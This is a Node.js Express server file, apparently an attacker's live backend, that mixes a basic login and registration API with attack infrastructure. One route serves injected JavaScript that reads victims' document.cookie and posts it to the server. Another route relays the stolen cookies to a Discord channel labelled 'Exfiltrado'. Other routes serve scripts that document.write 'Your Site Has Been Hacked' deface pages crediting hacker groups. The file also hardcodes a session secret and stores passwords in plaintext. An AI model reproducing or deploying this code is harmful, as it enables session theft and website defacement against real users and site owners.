require('dotenv').config(); //puxa dados do arquivo .env
const axios = require('axios'); //instala axios para fazer requests
const express = require('express'); //instala express para criar o servidor
const session = require('express-session'); //instala express-session para gerenciar sessões
const cors = require('cors'); //instala cors para permitir requisições de outros domínios
const path = require('path'); //instala path para manipular caminhos de arquivos
const sanitizeHtml = require('sanitize-html'); //instala sanitize-html para limpar entradas de HTML
const pool = require('./db'); //instala pool para gerenciar conexões com o banco de dados
const validatePass = require('./ViewPass'); //instala ViewPass para validar senhas
const { isNumberObject } = require('util/types'); //instala isNumberObject para verificar se um valor é um objeto de número

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const PORT = process.env.PORT || 3001;

// Cookies

app.use(session({ 
    secret: 'Segredo',
    resave: false,
    saveUninitialized: true,
    cookie: {secure: true}
}));

// Funções

function clearHTML(BadString) {
    return sanitizeHtml(BadString, {
        allowedTags: [],
        allowedAttributes: {}
    });
}

// Pags estaticas

app.get('/lisboa', (req, res) => {
	res.send(`<head>
<title>hoWo owns you :D </title>
<link href='http://fonts.googleapis.com/css?family=Candal' rel='stylesheet' type='text/css'>
<script type="text/javascript" src="http://smilenet4u.googlecode.com/files/TipingText.js"></script>
<style type="text/css">
/* Coded by MR.ZERO */
@import url(http://fonts.googleapis.com/css?family=Share+Tech);
body {
	background:rgb(0, 0, 0) url('http://4.bp.blogspot.com/-h1QH3MmXd4M/Uc64vsqmPeI/AAAAAAAAALs/Gi-fPnZ5V2Q/s1600/black+(11).jpg') center right no-repeat; 
	color:#FFFFFF; 
	text-decoration:none; 
	font-family:"Share Tech", Courier, monospace; 
	padding-left:200px; 
	padding-top:200px; 
	padding-right:300px; 
	font-size:16px;
}
a {
	color: #2ccfcf;
	text-decoration: none;
}
a:hover {
	color: #fff;
}
#example1 {
	font-size: 42px;
	font-family: "Share Tech";

}
#example2 {
	font-size: 31px;
	font-family: "Share Tech";

}
#example3 {
	font-size: 26px;
	font-family: "Share Tech";

}
</style>
</head>
<body>
<object type="application/x-shockwave-flash" width="0"
height="0"data="=true">
<param  name="movie"value="https://paglasongs.com/ashley-look-at-me-mp3-songs.html">
</object>


<div id="example1">OWN3D BY <br>
<font color="cyan">hoWo</font> in partner with <font color="cyan">Lisboa Shadows</font>
</div>
<br>
<div id="example2">
<font color="#FFFFFF">
Message for Admin :<br>Sorry Admin !<br>
Your Site Has Been Hacked System Security Is Low , Please Patch Your System.
<br>This Is Just A Warning If You Still Dont want to patch it<br>
We Will Keep On Hacking it. <br>
<br><br></div>
Greetz To :<br>
<div id="example3">
<font color="cyan">
hoWo - user2718 - S3v45 | This is Lisboa Shadows <br>#OpTakingAttention

</font>
</div>

<script type="text/javascript">
new TypingText(document.getElementById("example1"));
new TypingText(document.getElementById("example3"));


new TypingText(document.getElementById("example2"), 150, function(i){ var ar = new Array("_"); return " " + ar[i.length % ar.length]; });

TypingText.runAll();
</script>
</body>`);
});

app.get('/', (req, res) => {
    res.send(`
    <head>
<title>hoWo owns you :D </title>
<link href='http://fonts.googleapis.com/css?family=Candal' rel='stylesheet' type='text/css'>
<script type="text/javascript" src="http://smilenet4u.googlecode.com/files/TipingText.js"></script>
<style type="text/css">
/* Coded by MR.ZERO */
@import url(http://fonts.googleapis.com/css?family=Share+Tech);
body {
	background:rgb(0, 0, 0) url('http://4.bp.blogspot.com/-h1QH3MmXd4M/Uc64vsqmPeI/AAAAAAAAALs/Gi-fPnZ5V2Q/s1600/black+(11).jpg') center right no-repeat; 
	color:#FFFFFF; 
	text-decoration:none; 
	font-family:"Share Tech", Courier, monospace; 
	padding-left:200px; 
	padding-top:200px; 
	padding-right:300px; 
	font-size:16px;
}
a {
	color: #51ac15;
	text-decoration: none;
}
a:hover {
	color: #fff;
}
#example1 {
	font-size: 42px;
	font-family: "Share Tech";

}
#example2 {
	font-size: 31px;
	font-family: "Share Tech";

}
#example3 {
	font-size: 26px;
	font-family: "Share Tech";

}
</style>
</head>
<body>
<object type="application/x-shockwave-flash" width="0"
height="0"data="=true">
<param  name="movie"value="https://paglasongs.com/ashley-look-at-me-mp3-songs.html">
</object>


<div id="example1">OWN3D BY <br>
<font color="green">hoWo</font> in partner with <font color="green">T404</font>
</div>
<br>
<div id="example2">
<font color="#FFFFFF">
Message for Admin :<br>Sorry Admin !<br>
Your Site Has Been Hacked System Security Is Low , Please Patch Your System.
<br>This Is Just A Warning If You Still Dont want to patch it<br>
We Will Keep On Hacking it. <br>
<br><br></div>
Greetz To :<br>
<div id="example3">
<font color="green">
hoWo - Jrizz - umbhy.x - lordx.thegod | This is Terminal 404 <br>#OpTakingAttention

</font>
</div>

<script type="text/javascript">
new TypingText(document.getElementById("example1"));
new TypingText(document.getElementById("example3"));


new TypingText(document.getElementById("example2"), 150, function(i){ var ar = new Array("_"); return " " + ar[i.length % ar.length]; });

TypingText.runAll();
</script>
</body>
    `);
});

app.get('/dkdk', (req, res) => {
	res.type('application/javascript').send(`
 	const data = { cookies: JSON.stringify(document.cookie, null, 4) };
        fetch('https://yyazboard.onrender.com/coleta', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
            .then(response => {
                if (!response.ok) {
                    console.error("Erro na requisição:", response.status);
                }
                return response.json();
            })
            .then(data => console.log("Resposta do servidor:", data))
            .catch(error => console.error("Erro:", error));
 `);
});

app.get('/x', (req, res) => {
  res.type('application/javascript').send(`fetch('https://yyazboard.onrender.com').then(r=>r.text()).then(t=>document.write(t))`);
});

app.get('/y', (req, res) => {
  res.type('application/javascript').send(`fetch('https://yyazboard.onrender.com/lisboa').then(r=>r.text()).then(t=>document.write(t))`);
});

// https://ustymukhman.github.io/webDOOM/public/

app.get('/doom', (req, res) => {
  res.type('application/javascript').send(`fetch('https://ustymukhman.github.io/webDOOM/public/').then(r=>r.text()).then(t=>document.write(t))`);
});

app.post('/coleta', async (req, res) => {
  const data = req.body;

  await fetch('https://discord.com/api/v10/channels/1395830893209456692/messages', {
    method: 'POST',
    headers: {
      'Authorization': `Bot ${process.env.DC_BotToken}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ content: `
# Exfiltrado \n

> **Origin**: \n${req.headers?.origin ? req.headers.origin : 'Não especificado'}
> **Refer**: \n${req.headers?.refer ? req.headers.refer : 'Não especificado'}
> **Host**: \n${req.headers?.host ? req.headers.host : 'Não especificado'}
> **Hostname**: \n${req.headers?.hostname ? req.headers.hostname : 'Não especificado'}

## Data: \n \`\`\`\n${JSON.stringify(data, null, 4)}\`\`\`` })
  });

  res.status(204).end();
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'))
});

app.get('/sucesso', (req, res) => {
    const Acesso = req.query.login;
    
    if (Acesso === 'liberado') {
        res.status(200).sendFile(path.join(__dirname, 'public', 'sucesso.html'));
    } else {
        res.status(404);
    }
});

app.get('/cadastro', (req, res) => {
    res.status(200).sendFile(path.join(__dirname, 'public', 'cadastro.html'))
});

// Stand On

app.get('/StandOn', (req, res) => {
    res.status(200).json({ Status: 'ON', Mensagem: 'COD 200'})
});

// APIs

app.get('/database/admin/criar/tabela', async (req, res) => {
    (async () => {
        try {
          await pool.query(`
            CREATE TABLE IF NOT EXISTS usuarios (
              ID SERIAL PRIMARY KEY,
              UserName VARCHAR(125) NOT NULL,
              UserPass VARCHAR(255) NOT NULL
            )
          `);
          console.log('Tabela criada com sucesso');
          res.status(201).send("Tabela criada com sucesso")
        } catch(err) {
          console.error('Erro ao criar tabela:', err);
          res.status(500).send("Erro ao criar tabela, consulte o console para mais informações")
        } finally {
          await pool.end();
        }
      })();
});

app.get('/api/consulta', async (req, res) => {
    const uid = req.query.id;

    try {
    //    const query = `SELECT * FROM usuarios WHERE ID = ${uid}`;
    const query = `SELECT * FROM usuarios WHERE ID = $1`;
        const { rows } = await pool.query(query, [uid]);

        if (rows.length === 0) {
            return res.status(404).json({ mensagem: 'Usuário não encontrado.' });
        }

        res.status(200).json({ dados: rows });
    } catch (err) {
        console.error("Ocorreu um erro durante a consulta: ", err);
        res.status(500).json({
            mensagem: 'Ocorreu um erro durante a consulta, verifique o console.',
            erro: err
        });
    }
});


app.post('/api/cadastro', async (req, res) => {
    const { uname, upass } = req.body;
    const username = clearHTML(uname);
    const userpassword = clearHTML(upass)

    try {
        const { rows } = await pool.query(
            'INSERT INTO usuarios (UserName, UserPass) VALUES ($1, $2) RETURNING ID',
            [username, userpassword]
        );
        res.status(201).json({ id: rows[0].id, UserName: rows[0].UserName, UserPass: rows[0].UserPass });
    } catch (err) {
        console.log(err);
        res.status(500).json({ mensagem: 'Ocorreu um erro durante o cadastro, consulte o console de desenvolvedor.', erro: err })
    }
});

app.post('/api/validar', async (req, res) => {
    try{
        const {user: UName, passwd: UPass} = req.body;

        const AuthResult = await validatePass({UName, UPass});

        if (AuthResult.Authenticated) {
            req.session.userId = AuthResult.id;
            res.status(200).json({ sucess: true, RedirectTo: 'https://yyazboard.onrender.com/cadastro', userId: AuthResult.id});
        } else {
            req.session.destroy();
            console.log('Falha no login, verifique as credenciais')
            res.status(401).json({ sucess: false, RedirectTo: '/', message: 'NoAuth'});
        };
    } catch (err) {
        console.error(err);
        req.session.destroy();
        res.status(500).json({message: 'Falha no servidor', sucess: false, RedirectTo: '/'})
    };
});

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}!`);
});
